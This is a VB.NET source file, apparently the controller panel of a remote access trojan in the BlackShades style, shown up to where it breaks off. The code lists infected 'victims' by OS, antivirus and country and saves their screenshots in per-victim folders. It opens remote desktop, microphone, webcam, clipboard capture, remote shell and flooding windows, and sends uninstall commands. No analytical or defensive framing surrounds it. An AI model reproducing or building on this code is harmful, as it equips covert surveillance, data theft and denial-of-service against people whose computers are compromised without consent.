Imports System.Threading
Imports System.IO
Public Class Main
    Public Sub armitage()

        Dim box As PictureBox = PictureBox1
        Dim imgx As New PictureBox
        imgx.Image = My.Resources.Armi
        imgx.Height = L1.Height
        imgx.Width = L1.Width
        L1.BackgroundImage = imgx.Image

        L1.SmallImageList = IMG
        L1.LargeImageList = IMG

        Dim i As Integer = 0
        For Each computer In L1.Items

            Dim hacked As String = computer.SubItems(3).Text

            If hacked.Contains("10") Or hacked.Contains("8.1") Then
                If hacked.Contains("10") Then
                    If L1.Items(i).Text.Contains("10") Then

                    Else
                        L1.Items(i).Text += vbNewLine & "Windows 10"
                    End If

                ElseIf hacked.Contains("8.1") Or hacked.Contains("8") Then

                    If L1.Items(i).Text.Contains("8.1") Then

                    Else
                        L1.Items(i).Text += vbNewLine & "Windows 8.1"
                    End If
                End If
                L1.Items(i).ImageIndex = 0
            ElseIf hacked.Contains("7") Or hacked.Contains("Vista") Then
                If hacked.Contains("7") Then
                    If L1.Items(i).Text.Contains("7") Then

                    Else
                        L1.Items(i).Text += vbNewLine & "Windows 7"
                    End If

                ElseIf hacked.Contains("Vista") Then
                    If L1.Items(i).Text.Contains("Vista") Then

                    Else
                        L1.Items(i).Text += vbNewLine & "Windows Vista"
                    End If

                End If

                L1.Items(i).ImageIndex = 2
            ElseIf hacked.Contains("XP") Or hacked.Contains("xp") Then
                If L1.Items(i).Text.Contains("Windows XP") Then

                Else
                    L1.Items(i).Text += vbNewLine & "Windows XP"
                End If

                L1.Items(i).ImageIndex = 1
            ElseIf hacked.Contains("Linux") Or hacked.Contains("linux") Or hacked.Contains("Ubuntu") Then
                If L1.Items(i).Text.Contains("Linux") Then

                Else
                    L1.Items(i).Text += vbNewLine & "Linux"
                End If

                L1.Items(i).ImageIndex = 3
            ElseIf hacked.Contains("Server") Or hacked.Contains("server") Or hacked.Contains("SERVER") Then
                If L1.Items(i).Text.Contains("Windows Server") Or L1.Items(i).Text.Contains("Windows server") Then

                Else
                    L1.Items(i).Text += vbNewLine & "Windows Server"
                End If

                L1.Items(i).ImageIndex = 6
            ElseIf hacked.Contains("MAC") Or hacked.Contains("OSX") Or hacked.Contains("iOS") Then
                If L1.Items(i).Text.Contains("Uinux[MAC][iOS]") Then

                Else
                    L1.Items(i).Text += vbNewLine & "Uinux[MAC][iOS]"
                End If

                L1.Items(i).ImageIndex = 4
            Else
                If L1.Items(i).Text.Contains("Unknowen OS ") Then

                Else
                    L1.Items(i).Text += vbNewLine & "Unknowen OS "
                End If

                L1.Items(i).ImageIndex = 5
            End If
            i += 1
        Next





    End Sub
    Public UODNNXMATTYW As Size
    Dim victimname As String
    Public ServerID As String
    Public WithEvents S As KX
    Public country As String
    Public Yy As String = "|BlueEagle|"
    Public pinger As Integer = 0
    Public tictoc As Integer = 0
    Public folder As String
    Public folder1 As String
    Dim appPath As String
    Dim Message As String
    Public xxx As Integer
    Dim fastScreen As New PictureBox
    Dim id$
    Dim ip$
    Dim RAT_Port
    Dim listimage As New ImageList
    Dim server As Boolean
    Dim ratcountry As String = ""
    Dim victim_folder As String
    Function QZ(ByVal q As Integer) As Size '
        On Error Resume Next
        Do '>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>


            Dim AOPXTTPODCCMO As New Size(UODNNXMATTYW)
            Dim TT# = 1.1, YY = 1.3, UU# = 2.1, OO# = 1.5, UI# = 2.2, RR# = 1.9, AZQ# = 2.5, EWQ# = 3.5
            Dim Xe# = 3, YqWT# = 4, N# = 5, UM# = 6, UEEQS# = 2
            Select Case q
                Case 0
                    Return UODNNXMATTYW
                Case 1
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / TT
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / TT
                Case 2
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / YY
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / YY
                Case 3
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / OO
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / OO
                Case 4
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / RR
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / RR
                Case 5
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / UEEQS
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / UEEQS
                Case 6
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / UU
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / UU
                Case 7
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / UI
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / UI
                Case 8
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / AZQ
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / AZQ
                Case 9
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / Xe
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / Xe
                Case 10
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / EWQ
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / EWQ
                Case 11
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / YqWT
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / YqWT
                Case 12
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / N
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / N
                Case 13
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / UM
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / UM
            End Select
            AOPXTTPODCCMO.Width = Mid(AOPXTTPODCCMO.Width.ToString, 1, AOPXTTPODCCMO.Width.ToString.Length - 1) & 0
            AOPXTTPODCCMO.Height = Mid(AOPXTTPODCCMO.Height.ToString, 1, AOPXTTPODCCMO.Height.ToString.Length - 1) & 0
            Return AOPXTTPODCCMO
        Loop '>>>>>>>>>>>>>>>>
    End Function
    Sub MapPlotter(ByVal country As String)
        cord_getter(country)
    End Sub
    Dim startxpoint As Single
    Dim startypoint As Single
    Dim havepoints As Boolean
    Sub cord_getter(ByVal City As String)
        On Error Resume Next
        Dim x As String = ""
        Dim database As New RichTextBox
        database.Text = My.Resources.countryinfo
        For Each line In database.Lines
            If line.Contains(City) Then
                x = line.Replace(City & "|", "")
                Dim coords() As String = x.Split(",")
                '      mapcoords(coords(0), coords(1))
                country = City
                pic2(coords(0), coords(1))
            End If
        Next
    End Sub
    Sub pic2(ByVal latitude As Double, ByVal longitude As Double)
        Dim pbwidth As Double = map.Width
        Dim pbheight As Double = map.Height
        Dim longratio As Double = pbwidth / 360
        Dim latratio As Double = pbheight / 180
        Dim latcord As Double = 90 - latitude
        Dim longcord As Double = (180 + longitude)
        latcord = latratio * latcord
        longcord = longratio * longcord
        Dim g As Graphics = map.CreateGraphics
        Dim flag As Image = ImageList1.Images(GetCountryNumber(UCase(country)))
        g.DrawImage(flag, CInt(longcord) - 1, CInt(latcord) - 1, 18, 16)
        If ratcountry = "" Then
            Timer1.Stop()
            ratcountry = InputBox("Enter Country you are in", "Country")
            MapPlotter(ratcountry)
            Hacker.Start()
        End If
        If havepoints = False Then
            startxpoint = CInt(longcord) - 1
            startypoint = CInt(latcord) - 1
            havepoints = True
        ElseIf havepoints = True Then
         If startxpoint <> Nothing And startypoint <> Nothing Then
                DrawLineFloat(getstartpoint(startxpoint, startypoint), getendpoint(CInt(longcord) - 1, CInt(latcord) - 1))
                End If
        End If
        Timer1.Start()
    End Sub

    Private Sub RemoveCity(ByVal City As String)
        On Error Resume Next
        Dim x As String = ""
        Dim database As New RichTextBox
        database.Text = My.Resources.countryinfo
        Dim i As Integer = 0
        For Each line In database.Lines




            If line.Contains(City) Then
                x = line.Replace(City & "|", "")
                Dim coords() As String = x.Split(",")
                RemoveCity(coords(0), coords(1))
                map.Update()
            End If
        Next



    End Sub
    Function getcountry(ByVal ip As String) As String
        For Each client As ListViewItem In L1.Items
            If client.SubItems(1).ToString.Contains(ip) Then
                country = client.SubItems(4).ToString
            End If
        Next
        Return country.Replace("ListViewSubItem: {", "").Replace("}", "")
    End Function
    Sub RemoveCity(ByVal latitude As Double, ByVal longitude As Double)
        Dim pbwidth As Double = map.Width
        Dim pbheight As Double = map.Height
        Dim longratio As Double = pbwidth / 360
        Dim latratio As Double = pbheight / 180
        Dim latcord As Double = 90 - latitude
        Dim longcord As Double = (180 + longitude)
        latcord = latratio * latcord
        longcord = longratio * longcord

        Dim pen1 As New Pen(Brushes.Black, 10)
        Dim g As Graphics = map.CreateGraphics
        Dim flag As Image = ImageList1.Images(452).Clone
        g.DrawImage(flag, CInt(longcord) - 1, CInt(latcord) - 1, 18, 16)



    End Sub
    Sub Disconnect(ByVal xxx As Integer) Handles S.DisConnected
        Try

            Dim IP As String = S.IP(xxx)
            L1.Items(xxx.ToString).Remove()
            RichTextBox2.AppendText(IP & " Disconnected" & vbNewLine)
            Disconnected(IP)
            '  ListBox1.Items.Add("UserLogout :" + " IP: " + S.IP(xxx) + " ServerID : " + ServerID + " Time : " + TimeValue(Now) + "Country :" + getcountry(IP))
            RemoveCity(getcountry(IP))

            ListView1.Items(xxx.ToString).Remove()
            PictureBox1.Image = Nothing
            listimage.Images.RemoveAt(S.IP(xxx))
            For Each Form As Windows.Forms.Form In My.Application.OpenForms
                If Form.Name.Contains(xxx) Then
                    Form.Close()
                End If
            Next
        Catch ex As Exception
        End Try
    End Sub
    Private Sub Insert(ByVal IP As String)

        If RichTextBox1.Text.Contains(IP) Then
        Else
            RichTextBox1.Text &= IP & vbNewLine
            ListView2.Items.Add(IP)
        End If
        For i = 0 To ListView2.Items.Count - 1
            If ListView2.Items(i).Text = IP Then
                ListView2.Items(i).ForeColor = Color.Lime
            End If
        Next
        GetHttpLocation(IP)

    End Sub
    Private Function fnLocalIp() As String
        Try
            Dim h As System.Net.IPHostEntry = System.Net.Dns.GetHostByName(System.Net.Dns.GetHostName)
            Dim strLocalIp As String = h.AddressList.GetValue(0).ToString
            Dim substring As String = strLocalIp.Substring(0, CInt(strLocalIp.Length / 2) + 1)
            Return substring
        Catch ex As Exception
        End Try
    End Function
    Private Sub GetHttpLocation(ByVal Ipaddress As String)
        Try

            If (Ipaddress.Contains("127.0.0") Or Ipaddress.Contains(fnLocalIp)) Then

                For x = 0 To ListView2.Items.Count - 1
                    Ipaddress = ListView2.Items(x).Text

                    Dim xmldoc As New System.Xml.XmlDocument
                    Dim xmlnode As System.Xml.XmlNodeList
                    Dim i As Integer
                    xmldoc.Load("http://freegeoip.net/xml/")
                    xmlnode = xmldoc.GetElementsByTagName("Response")
                    For i = 0 To xmlnode.Count - 1

                        xmlnode(i).ChildNodes.Item(0).InnerText.Trim()
                        country = (xmlnode(i).ChildNodes.Item(2).InnerText.Trim)
                        ListView2.Items(x).ImageIndex = GetCountryNumber(UCase(country))
                    Next

                Next
            Else

                For x = 0 To ListView2.Items.Count - 1
                    Ipaddress = ListView2.Items(x).Text

                    Dim xmldoc As New System.Xml.XmlDocument
                    Dim xmlnode As System.Xml.XmlNodeList
                    Dim i As Integer
                    xmldoc.Load("http://freegeoip.net/xml/" & Ipaddress)
                    xmlnode = xmldoc.GetElementsByTagName("Response")
                    For i = 0 To xmlnode.Count - 1

                        xmlnode(i).ChildNodes.Item(0).InnerText.Trim()
                        country = (xmlnode(i).ChildNodes.Item(2).InnerText.Trim)
                        ListView2.Items(x).ImageIndex = GetCountryNumber(UCase(country))
                    Next


                Next
            End If

        Catch ex As Exception

        End Try





    End Sub
    Private Sub Disconnected(ByVal IP As String)
        For i = 0 To ListView2.Items.Count - 1
            If ListView2.Items(i).Text = IP Then
                ListView2.Items(i).ForeColor = Color.Red
                ListView2.Items(i).ImageIndex = 452
            End If
        Next

    End Sub

    Private Sub L1_SelectedIndexChanged(sender As System.Object, e As System.EventArgs) Handles L1.SelectedIndexChanged
        On Error Resume Next
        armitage()
        If L1.SelectedItems.Count = 1 Then
            copyinfo()
            infg()
        Else
            ListView1.Items.Clear()
        End If
        infg()
        For Each item As ListViewItem In L1.Items
            item.ForeColor = Color.Yellow

        Next

    End Sub
    Sub copyinfo()
        ListView1.Items.Clear()
        Dim lolo As New ListViewItem
        For Each info In L1.FocusedItem.SubItems
            lolo.SubItems.Add(info)

        Next
        Dim Cuntry As String = L1.FocusedItem.SubItems(4).Text
        lolo.ImageIndex = GetCountryNumber(UCase(Cuntry))

        ListView1.Items.Add(lolo)

    End Sub
    Sub infg()



        Dim folders = (Application.StartupPath & "/VictimsFolder/" & (L1.Items.Item(L1.FocusedItem.Index).SubItems.Item(0).Text) + "\Star.01")


        id = (L1.Items.Item(L1.FocusedItem.Index).SubItems.Item(0).Text)
        ip = (L1.Items.Item(L1.FocusedItem.Index).SubItems.Item(1).Text)




        If CheckBox1.Checked Then
            For Each x As ListViewItem In L1.SelectedItems
                If L1.SelectedItems.Count = 1 Then
                    S.Send(x.ToolTipText, "!!")
                End If
            Next
            PictureBox1.Image = Nothing



        End If
        For Each x As ListViewItem In L1.SelectedItems
            pingerTimers.Start()
            If CheckBox2.Checked = True Then
                S.Send(x.ToolTipText, "infoDesk")
            End If

        Next

        Dim sc As String
        'sc = L1.Items.Item(L1.FocusedItem.Index).SubItems.Item(7).Text
        'Label1.Text = L1.Items.Item(L1.FocusedItem.Index).SubItems.Item(14).Text
        'If Label1.Text = "Powered Charging - 100%" Then
        '    PictureBox3.ImageLocation = "IOS\sys\S2.png"
        'Else
        '    PictureBox3.ImageLocation = "IOS\sys\S1.png"
        'End If






    End Sub
    Private Sub pingerTimers_Tick(sender As System.Object, e As System.EventArgs) Handles pingerTimers.Tick
        pinger += 1

    End Sub

    Private Sub Transparent_FormClosing(sender As Object, e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        End
    End Sub
    Private Sub ShutdownToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ShutdownToolStripMenuItem.Click

        For Each item In ListView1.Items
            ListView1.Items.Remove(item)
        Next
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "Uninstall")
        Next
        PictureBox1.Image = Nothing
    End Sub

    Private Sub BlackShadesNetButton1_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton1.Click
        Builder.Show()
    End Sub

    Private Sub L1_MouseHover(sender As System.Object, e As System.EventArgs) Handles L1.MouseHover
        armitage()

    End Sub

    Sub fastscreens()

        For Each x As ListViewItem In L1.Items
            If L1.SelectedItems.Count = 1 Then
                S.Send(x.ToolTipText, "!!")
            End If
        Next
        L1.LargeImageList = listimage

        For i = 0 To listimage.Images.Count - 1
            For j = 0 To L1.Items.Count - 1
                If listimage.Images.Keys(i).Contains(L1.Items(j).SubItems(1).Text) Then
                    L1.Items(j).ImageKey = listimage.Images.Keys(i)
                End If
            Next
        Next




    End Sub
    Sub old()

        For i = 0 To listimage.Images.Count - 1
            For j = 0 To L1.Items.Count - 1
                If L1.Items(j).ToolTipText = i Then
                    L1.Items(j).ImageKey = i

                End If
            Next
            i += 1
        Next
    End Sub

    Private Sub RemoteDestopToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RemoteDestopToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "!")

        Next
    End Sub

    Private Sub MicrophoneToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles MicrophoneToolStripMenuItem.Click

        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "Mic")

        Next
    End Sub

    Private Sub WebCamToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles WebCamToolStripMenuItem.Click

        For Each x As ListViewItem In L1.SelectedItems
            If L1.SelectedItems.Count = 1 Then
                S.Send(x.ToolTipText, "camlist")

            Else
                MsgBox("Please Choose Only one Client", MsgBoxStyle.Critical)
            End If

        Next
    End Sub
    Delegate Sub _Data(ByVal sock As Integer, ByVal B As Byte())
    Sub Data(ByVal sock As Integer, ByVal B As Byte()) Handles S.Data
        Dim encoded As String = BS(B)

        Dim newBytes() As Byte = Convert.FromBase64String(BS(B)) 'encoded byte array

        Dim T As String = BS(newBytes)

        Dim A As String() = Split(T, Yy)
        Try
            Select Case A(0)
                Case "info"
                    Dim f As nofiy = My.Application.OpenForms("new" & sock)
                    If f Is Nothing Then
                        If Me.InvokeRequired Then
                            Me.Invoke(New _Data(AddressOf Data), New Object() {sock, B})
                            Exit Sub
                        End If
                      
                            ListView2.FindItemWithText(S.IP(sock)).ImageIndex = GetCountryNumber(UCase(A(4)))

                        f = New nofiy
                        f.Name = "new" & sock
                        f.Label1.Text = S.IP(sock)
                        f.Label2.Text = A(1)
                        f.Label3.Text = A(2)
                        f.Label4.Text = A(3)
                        f.Label5.Text = A(4)
                        ServerID = A(1)
                        '       ListBox1.Items.Add("User Login :" + " IP: " + S.IP(sock) + " ServerID : " + A(1) + " Time : " + TimeValue(Now))
                        My.Computer.Audio.Play(My.Resources.notify, AudioPlayMode.Background)
                        f.Show()

                        ' My.Computer.Audio.Play(My.Resources.notify)
                        Dim L = L1.Items.Add(sock.ToString, A(1), GetCountryNumber(UCase(A(3)))) 'name + country 

                        L.SubItems.Add(S.IP(sock)) 'ip
                        L.SubItems.Add(A(2)) 'user
                        L.SubItems.Add(A(3)) 'os
                        L.SubItems.Add(A(4)) 'country
                        L.SubItems.Add(A(5)) 'antivirus
                        L.SubItems.Add(A(6)) 'ram
                        L.SubItems.Add(A(7)) 'version
                        L.SubItems.Add(A(8)) 'active Window
                        L.SubItems.Add(A(9)) 'cam
                        ' L.SubItems.Add(A(10))
                        'L.SubItems.Add(A(11))
                        'L.SubItems.Add(A(12))
                        'L.SubItems.Add(A(13))
                        L.ToolTipText = sock
                        RichTextBox2.AppendText(S.IP(sock) & "Logged in" & vbNewLine)
                        RichTextBox2.ScrollToCaret()

                        ''''''''''''''''''''''''''''''''''''''''''''''''''

                        If hard.Text = 1 Then

                            Dim pi As New PictureBox
                            Dim m As New IO.MemoryStream(Convert.FromBase64String(A(10)))
                            SyncLock pi




                                pi.Image = Image.FromStream(m)



                                f.PictureBox3.Image = pi.Image


                            End SyncLock

                        End If


                    End If

                    For Each victim As ListViewItem In L1.Items
                        If victim.Text.Contains(A(1)) Then

                            If My.Computer.FileSystem.DirectoryExists(Application.StartupPath & "\VictimsFolder\" & A(1) & S.IP(sock) & "\Download\") Then
                            Else
                                My.Computer.FileSystem.CreateDirectory(Application.StartupPath & "\VictimsFolder\" & A(1) & S.IP(sock) & "\Download\")
                            End If
                            If My.Computer.FileSystem.DirectoryExists(Application.StartupPath & "\VictimsFolder\" & A(1) & S.IP(sock) & "\Screen Capture\") Then
                            Else
                                My.Computer.FileSystem.CreateDirectory(Application.StartupPath & "\VictimsFolder\" & A(1) & S.IP(sock) & "\Screen Capture\")
                            End If

                            folder = (Application.StartupPath & "\VictimsFolder\" + A(1) & S.IP(sock) + "\Download\")
                            folder1 = (Application.StartupPath & "\VictimsFolder\" & (A(1) & S.IP(sock)) & "\Screen Capture\")

                            f.PictureBox3.Image.Save((Application.StartupPath & "/VictimsFolder/" & A(1) & S.IP(sock) & "/Screen Capture/" & "FastScareen.jpg"), Imaging.ImageFormat.Jpeg)

                        Else

                            If My.Computer.FileSystem.DirectoryExists(Application.StartupPath & "\VictimsFolder\" & A(1) & S.IP(sock) & "\Download\") Then
                            Else
                                My.Computer.FileSystem.CreateDirectory(Application.StartupPath & "\VictimsFolder\" & A(1) & S.IP(sock) & "\Download\")
                            End If
                            If My.Computer.FileSystem.DirectoryExists(Application.StartupPath & "\VictimsFolder\" & A(1) & S.IP(sock) & "\Screen Capture\") Then
                            Else
                                My.Computer.FileSystem.CreateDirectory(Application.StartupPath & "\VictimsFolder\" & A(1) & S.IP(sock) & "\Screen Capture\")
                            End If

                            folder = (Application.StartupPath & "\VictimsFolder\" + A(1) & S.IP(sock) + "\Download\")
                            folder1 = (Application.StartupPath & "\VictimsFolder\" & (A(1) & S.IP(sock)) & "\Screen Capture\")

                            f.PictureBox3.Image.Save((Application.StartupPath & "/VictimsFolder/" & A(1) & S.IP(sock) & "/Screen Capture/" & "FastScareen.jpg"), Imaging.ImageFormat.Jpeg)

                        End If
                    Next



                Case "@@" '
                    Dim BB As Byte() = fx(B, "@@" & Yy)(1)

                Case "!"
                    If My.Application.OpenForms("!" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim cap As New RDP
                    cap.F = Me
                    cap.Sock = sock
                    cap.Name = "!" & sock
                    cap.Sz = New Size(A(1), A(2))
                    cap.Text &= " " & S.IP(sock)
                    cap.SkyDarkForm1.Text &= " " & S.IP(sock)
                    cap.Focus()
                    cap.Show()
                Case "stat"
                    If My.Application.OpenForms("stat" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim f As New netstat
                    f.sock = sock
                    f.Name = "stat" & sock
                    ' f.Text = "NetWork Adapter & Connections For : " & S.IP(xxx)
                    f.SkyDarkForm1.Text &= " " & S.IP(sock)
                    f.Show()

                Case "code"
                    If My.Application.OpenForms("code" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim f As New Compiler
                    f.sock = sock
                    f.Name = "code" & sock
                    ' f.Text = "NetWork Adapter & Connections For : " & S.IP(xxx)
                    f.SkyDarkForm1.Text &= " " & S.IP(sock)
                    f.Show()

                Case "getstat"
                    Dim F As netstat = My.Application.OpenForms("stat" & sock)
                    'Drivers
                    Dim Driver As New ListViewItem
                    Driver.Text = A(1)
                    If (A(1)).Contains("Wi-Fi") Or A(1).Contains("Wi") Then
                        Driver.ImageIndex = 2
                    End If
                    If (A(1)).Contains("Local Area") Then
                        Driver.ImageIndex = 1
                    End If
                    If (A(1)).Contains("MAC") Then
                        Driver.ImageIndex = 3
                    End If
                    If (A(1)).Contains("IPv4") Then
                        Driver.ImageIndex = 4
                    End If
                    If (A(1)).Contains("Local Link") Then
                        Driver.ImageIndex = 5
                    End If
                    F.ListView1.Items.Add(Driver)

                Case "stati"
                    Dim F As netstat = My.Application.OpenForms("stat" & sock)
                    'Connections
                    F.ListView2.Items.Add(A(1), 0)
                Case "staterror"

                    Dim F As netstat = My.Application.OpenForms("stat" & sock)
                    '   F.ListBox3.Items.Add("Error Recived From Victim" & A(1))
                Case "@"
                    Dim F As RDP = My.Application.OpenForms("!" & sock)
                    If F IsNot Nothing Then
                        If A(1).Length = 1 Then
                            ' F.BlackShadesNetForm1.Text = "Remote Desktop  : " & S.IP(sock) & "Size: " & siz(b.Length) & " ,No Changes"
                            If F.Button1.Text = "Stop" Then
                                S.Send(sock, "@" & Yy & F.c1.SelectedIndex & Yy & F.c2.Text & Yy & F.c.Value)
                            End If
                            Exit Sub
                        End If

                        Dim BB As Byte() = fx(newBytes, "@" & Yy)(1)
                        F.PktToImage(BB)
                    End If
                Case "micready"
                    If My.Application.OpenForms("mic" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim cap As New mic
                    cap.sock = sock
                    cap.Name = "mic" & sock
                    cap.SkyDarkForm1.Text &= " " & S.IP(sock)
                    cap.Focus()
                    cap.Show()
                Case "listenrec"
                    IO.File.WriteAllBytes(Application.StartupPath & "/VictimsFolder/" & tictoc & ".wav", Convert.FromBase64String(A(1)))

                    My.Computer.Audio.Play(Application.StartupPath & "/VictimsFolder/" & tictoc & ".wav", AudioPlayMode.WaitToComplete)

                Case "FLOOD"

                    Dim f As Flooder = My.Application.OpenForms("FLOOD" & sock)
                    If f Is Nothing Then
                        If Me.InvokeRequired Then
                            Me.Invoke(New _Data(AddressOf Data), New Object() {sock, B})
                            Exit Sub
                        End If
                        f = New Flooder
                        f.Sock = sock
                        f.Name = "FLOOD" & sock
                        '  f.Text += " | " & A(1)
                        f.SkyDarkForm1.Text &= " " & S.IP(sock)
                        f.Show()
                    End If
                Case "recording"
                    Dim F As mic = My.Application.OpenForms("mic" & sock)
                    If F IsNot Nothing Then

                        F.recording = True
                        F.SkyDarkButton1.Enabled = False
                        F.SkyDarkButton2.Enabled = True
                        Exit Sub

                    End If
                Case "recstop"
                    Dim F As mic = My.Application.OpenForms("mic" & sock)
                    If F IsNot Nothing Then
                        F.recording = False
                        ' F.BlackShadesNetForm1.Text = "Remote Desktop  : " & S.IP(sock) & "Size: " & siz(b.Length) & " ,No Changes"
                        F.SkyDarkButton2.Enabled = False
                        F.SkyDarkButton1.Enabled = True
                        S.Send(sock, "listenrecord")
                        Exit Sub
                    End If
                Case "nocam"
                    MsgBox("This Client : " & S.IP(sock) & " has no Camera")
                Case "sendinformation"

                    If My.Application.OpenForms("Information" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim info As New Computer_Information
                    info.sock = sock
                    info.Name = "Information" & sock
                    info.Text = info.Text & " " & S.IP(sock)
                    'information
                    info.ListView1.Items.Add("Victime Name : " & A(30), 0)
                    info.ListView1.Items.Add("Local Ip Address : " & S.IP(sock), 4)
                    info.ListView1.Items.Add("Port : " & A(21), 8)
                    info.ListView1.Items.Add("Version : " & A(8), 9)
                    info.ListView1.Items.Add("Ping : " & pinger & " ms", 10)
                    info.ListView1.Items.Add("Server Path : " & A(22), 11)
                    'user information
                    info.ListView2.Items.Add("Username : " & A(2), 0)
                    info.ListView2.Items.Add("Country : " & A(5), 12)
                    info.ListView2.Items.Add("Language : " & A(19), 13)
                    info.ListView2.Items.Add("Antivirus : " & A(6), 14)
                    info.ListView2.Items.Add("Webcam : " & A(9), 7)
                    info.ListView2.Items.Add("Active Window : " & A(10), 15)
                    info.ListView2.Items.Add("Local Time : " & A(11), 16)
                    info.ListView2.Items.Add("Computer Start Time : " & A(12), 17)
                    info.ListView2.Items.Add("Current Directory : " & A(13), 18)
                    info.ListView2.Items.Add("Command Line : " & A(20), 19)
                    info.ListView2.Items.Add("System Directory : " & A(14), 20)
                    info.ListView2.Items.Add("User Domain Name : " & A(15), 0)
                    info.ListView2.Items.Add("User Interactive : " & A(16), 21)
                    info.ListView2.Items.Add("Working Set : " & A(17), 22)
                    'Extra information
                    info.ListView3.Items.Add("Computer Name : " & A(1), 1)
                    info.ListView3.Items.Add("Operating System : " & A(3), 6)
                    info.ListView3.Items.Add("Operating System Platform : " & A(4), 6)
                    info.ListView3.Items.Add("Operating System version : " & A(18), 23)
                    info.ListView3.Items.Add("RAM : " & A(7), 24)
                    info.ListView3.Items.Add("Processor Name : " & A(23), 25)
                    info.ListView3.Items.Add("Identifier : " & A(24), 26)
                    info.ListView3.Items.Add("System Product : " & A(25), 27)
                    info.ListView3.Items.Add("BIOS Release Date : " & A(26), 28)
                    info.ListView3.Items.Add("BIOS Version : " & A(27), 29)
                    info.ListView3.Items.Add("System Manufacturer : " & A(28), 30)
                    info.ListView3.Items.Add("BIOS Vendor : " & A(29), 31)


                    info.SkyDarkForm1.Text &= " " & S.IP(sock)
                    info.Show()
                    pinger = 0



                Case "clipss"
                    Dim f As Clipboardmanager = My.Application.OpenForms("clipss" & sock)
                    If f Is Nothing Then
                        If Me.InvokeRequired Then
                            Me.Invoke(New _Data(AddressOf Data), New Object() {sock, B})
                            Exit Sub
                        End If
                        f = New Clipboardmanager
                        f.sock = sock
                        f.Name = "clipss" & sock
                        f.SkyDarkForm1.Text &= " " & S.IP(sock)
                        ' f.Text = "Get ClipBoard" & " - " & S.IP(xxx)
                        f.Show()
                    End If
                Case "camlist"
                    Dim f As cam = My.Application.OpenForms("cam" & sock)
                    If f Is Nothing Then
                        If Me.InvokeRequired Then
                            Me.Invoke(New _Data(AddressOf Data), New Object() {sock, B})
                            Exit Sub
                        End If
                        f = New cam
                        f.Name = "cam" & sock
                        f.sock = sock
                        For i As Integer = 1 To A.Length - 1
                            f.SkyDarkCombo1.Items.Add(A(i))
                        Next
                        f.SkyDarkForm1.Text &= " " & S.IP(sock)
                        f.Show()

                    End If
                Case "cam"
                    Dim f As cam = My.Application.OpenForms("cam" & sock)
                    If f IsNot Nothing Then
                        If A.Length = 2 Then
                            Dim m As New IO.MemoryStream(Convert.FromBase64String(A(1)))
                            SyncLock f.PictureBox1
                                f.PictureBox1.Image = Image.FromStream(m)
                            End SyncLock
                        End If
                    End If

                Case "recvcli"
                    Dim f As Clipboardmanager = My.Application.OpenForms("clipss" & sock)
                    f.TextBox1.Text = A(1)
                Case "clipimg"
                    Dim f As Clipboardmanager = My.Application.OpenForms("clipss" & sock)
                    Dim pi As New PictureBox
                    Dim m As New IO.MemoryStream(Convert.FromBase64String(A(1)))
                    SyncLock pi
                        pi.Image = Image.FromStream(m)
                        f.PictureBox1.Image = pi.Image
                    End SyncLock


                Case "rss"
                    If My.Application.OpenForms("rs" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim cmd As New cmd
                    cmd.sock = sock
                    cmd.Name = "rs" & sock
                    cmd.Text = cmd.T2.Text
